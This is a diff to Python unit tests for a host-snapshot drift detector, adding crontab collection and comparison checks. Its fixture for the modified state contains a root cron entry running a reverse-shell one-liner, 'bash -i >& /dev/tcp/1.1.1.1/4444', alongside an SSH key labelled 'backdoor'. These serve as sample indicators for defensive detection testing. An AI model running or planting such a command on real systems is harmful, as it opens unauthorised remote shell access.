@@ -25,6 +25,7 @@ class TestDiff(unittest.TestCase):
         with storage.get_connection() as conn:
             conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'host1', 'Linux');")
             conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 80, 'TCP', 'nginx');")
+            conn.execute("INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) VALUES (1, '/etc/crontab', 'root', '* * * * *', 'reboot');")
             conn.commit()
             
         data = load_snapshot_data(self.db_path_1)
@@ -32,12 +33,15 @@ class TestDiff(unittest.TestCase):
         self.assertEqual(data["metadata"]["hostname"], "host1")
         self.assertEqual(len(data["ports"]), 1)
         self.assertEqual(data["ports"][0]["port"], 80)
+        self.assertEqual(len(data["crontabs"]), 1)
+        self.assertEqual(data["crontabs"][0]["command"], "reboot")
 
     def test_load_snapshot_data_export(self):
         storage = OrinStorage(self.db_path_1)
         with storage.get_connection() as conn:
             conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'host1', 'Linux');")
             conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 80, 'TCP', 'nginx');")
+            conn.execute("INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) VALUES (1, '/etc/crontab', 'root', '* * * * *', 'reboot');")
             conn.commit()
             
         secret = "super_secure_passphrase"
@@ -49,6 +53,8 @@ class TestDiff(unittest.TestCase):
         self.assertEqual(data["metadata"]["hostname"], "host1")
         self.assertEqual(len(data["ports"]), 1)
         self.assertEqual(data["ports"][0]["port"], 80)
+        self.assertEqual(len(data["crontabs"]), 1)
+        self.assertEqual(data["crontabs"][0]["command"], "reboot")
 
     def test_compare_snapshots_drift(self):
         # Base Snapshot
@@ -63,7 +69,10 @@ class TestDiff(unittest.TestCase):
                 {"username": "musa", "uid": 1000, "gid": 1000, "home_dir": "/home/musa", "login_shell": "/bin/bash"}
             ],
             "ssh_keys": [],
-            "file_hashes": [{"file_path": "/etc/passwd", "sha256_hash": "hash1"}]
+            "file_hashes": [{"file_path": "/etc/passwd", "sha256_hash": "hash1"}],
+            "crontabs": [
+                {"source": "/etc/crontab", "user": "root", "schedule": "17 * * * *", "command": "run-parts /etc/cron.hourly"}
+            ]
         }
         
         # Target Snapshot (Modified state)
@@ -84,7 +93,11 @@ class TestDiff(unittest.TestCase):
                 {"username": "musa", "uid": 1000, "gid": 1000, "home_dir": "/home/musa", "login_shell": "/bin/sh"} # MODIFIED shell
             ],
             "ssh_keys": [{"user_account": "musa", "key_type": "ssh-ed25519", "fingerprint": "fp123", "raw_key_comment": "backdoor"}], # ADDED
-            "file_hashes": [{"file_path": "/etc/passwd", "sha256_hash": "hash_changed"}] # MODIFIED hash
+            "file_hashes": [{"file_path": "/etc/passwd", "sha256_hash": "hash_changed"}], # MODIFIED hash
+            "crontabs": [
+                {"source": "/var/spool/cron/crontabs/alice", "user": "alice", "schedule": "* * * * *", "command": "/tmp/backup.sh"},
+                {"source": "/etc/cron.d/shell", "user": "root", "schedule": "* * * * *", "command": "bash -i >& /dev/tcp/1.1.1.1/4444"}
+            ]
         }
         
         diff = compare_snapshots(base_data, target_data)
@@ -119,3 +132,12 @@ class TestDiff(unittest.TestCase):
         self.assertEqual(len(diff["file_hashes"]["modified"]), 1)
         self.assertEqual(diff["file_hashes"]["modified"][0]["file_path"], "/etc/passwd")
         self.assertEqual(diff["file_hashes"]["modified"][0]["new_hash"], "hash_changed")
+
+        # Verify crontabs drift
+        self.assertEqual(len(diff["crontabs"]["added"]), 2)
+        added_commands = [c["command"] for c in diff["crontabs"]["added"]]
+        self.assertIn("/tmp/backup.sh", added_commands)
+        self.assertIn("bash -i >& /dev/tcp/1.1.1.1/4444", added_commands)
+
+        self.assertEqual(len(diff["crontabs"]["removed"]), 1)
+        self.assertEqual(diff["crontabs"]["removed"][0]["command"], "run-parts /etc/cron.hourly")
